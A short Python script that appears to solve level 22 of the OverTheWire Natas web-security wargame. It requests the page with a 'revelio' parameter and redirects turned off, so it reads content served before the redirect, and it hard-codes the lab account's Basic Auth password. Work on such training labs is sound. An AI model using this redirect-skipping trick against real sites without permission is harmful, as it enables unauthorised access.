import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas22.natas.labs.overthewire.org/index.php?debug=1&revelio=1'
response = ''
# base auth
auth = HTTPBasicAuth('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

# setup a new session
session = requests.Session()
response = session.get(url, auth = auth, allow_redirects = False)
print(response.text)
